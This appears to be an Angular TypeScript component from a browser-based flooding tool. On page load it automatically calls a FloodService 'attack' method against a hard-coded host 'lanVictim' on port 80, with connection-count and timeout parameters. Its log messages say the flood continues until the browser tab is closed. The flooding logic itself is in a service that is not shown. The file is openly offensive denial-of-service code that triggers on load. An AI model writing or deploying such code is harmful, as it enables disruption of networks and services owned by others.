import {Component, OnInit} from '@angular/core';
import {Logger} from 'angular2-log4ts/src/app/core';
import {FloodService} from "app/services/flood/flood.service";

@Component({
  selector: 'app-flooder',
  templateUrl: './flooder.component.html',
  styleUrls: ['./flooder.component.css']
})
export class FlooderComponent implements OnInit {

  constructor(private _logger: Logger, private _floodService: FloodService) {
    //do nothing
  }

  ngOnInit() {
    let target: String = 'lanVictim'; //@todo refine
    let port: Number = 80; //@todo refine
    let maxConnections: Number = 10; //@todo refine
    let timeout: Number = 1.5; //@todo refine
    if (this._logger.isDebugEnabled) {
      this._logger.debug('FlooderComponent: Initiating flood now.');
    }
    // target: String, port: Number, maxConnections: Number, timeout: Number
    this._floodService.attack(target, port, maxConnections, timeout);
    if (this._logger.isDebugEnabled) {
      this._logger.debug('FlooderComponent: Flood is ongoing. Close your browser tab to terminate the flood.');
    }
  }

}
